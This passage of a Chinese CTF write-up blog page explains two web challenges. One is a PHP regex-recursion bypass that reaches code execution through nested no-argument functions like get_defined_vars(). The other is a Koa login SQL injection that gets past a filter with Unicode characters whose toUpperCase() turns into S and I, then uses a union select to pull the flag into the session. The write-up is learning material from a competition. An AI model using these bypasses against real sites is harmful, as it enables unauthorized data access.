}</code></pre><p>刚开始不清楚正则里(?R)的用法，看了别人的WP才知道这是PCRE的正则递归。在这道题里，就是按照递归的方式一直匹配<code>/[^\W]+\((?R)?\)/</code>，看下面这个例子<br><img src="https://i.loli.net/2019/01/08/5c3412a2631a6.jpg" alt></p>
<p>在匹配完b()之后，由于匹配不到[^\W]，正则就停止了。所以这里的代码执行点就是：嵌套函数且最后一个函数不能用参数值</p>
<p>有的师傅们用了get_defined_vars()获取http请求头。其实这个之前在打awd时上流量监控部分用到过，appache可以用getallheaders()来获取http头，但是nginx没有这个函数，可以用了get_defined_vars()，通过current()、next()进而选择可控参数,poc如下</p>
<p><img src="https://i.loli.net/2019/01/08/5c3413c0a9be1.png" alt></p>
<h1 id="Nodejs魔法"><a href="#Nodejs魔法" class="headerlink" title="Nodejs魔法"></a>Nodejs魔法</h1><p>Koa框架写的登陆页面，入库的语句都写出来了<br><img src="https://i.loli.net/2018/12/02/5c033d7cc5c7a.png" alt></p>
<p>看到这一步很关键，因为忘了看flag在哪个表里，后面浪费了很多时间</p>
<p>继续看到登陆的逻辑<br><img src="https://i.loli.net/2018/12/02/5c033d7ce1b2e.png" alt><br>传入的username&amp;&amp;password非空，并且经过safe函数过滤后带入查询，如果有结果则设定session为查询结果</p>
<p>##分析<br>一开始绕safe就饶了好久,尝试了各种注释。最后l0cal师傅提醒，在js里toUpperCase()是可以用拉丁文的unicode绕过的，例如<code>&quot;ſ&quot;.toUpperCase()&lt;=&gt;&quot;S&quot;</code>和<code>&quot;ı&quot;.toUpperCase()&lt;=&gt;&quot;I&quot;</code></p>
<p>那么select 和 union 都可以绕过</p>
<p>一开始想多了,一直在盲注,根据时候有session判断查询的真假，结果好多东西都绕不过去，而且没看代码还在傻乎乎的测表名，十分愚蠢</p>
<p>有好多语句都会500，估计是云服务做了限制。。到最后发现把用户名和密码置空，后面用union查询flag，那设置的session不就是flag么。。</p>
<p>真的是太菜了</p>

                
            </div>
            <div class="continue">
            <a href="/2018/12/21/Code-Breaking-Puzzles WriteUp/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
</section>

  <nav class="page-nav">
    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
  </nav>

    </main>
    <a class="not-found">not found!</a>
    <div class="search-items">
    </div>
    <a href="#header" id="top" style="display:none">
        <i class="fa fa-sort-asc fa-2x"></i>
    </a>
    <footer class="footer">
    <div class="footer-copyright">©️2017
    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
    </div>
</footer>

    <script src="/js/jquery.js"></script>
    <script src="/js/toki.js"></script>  
  <script>hljs.initHighlightingOnLoad();</script>
</body>
</html>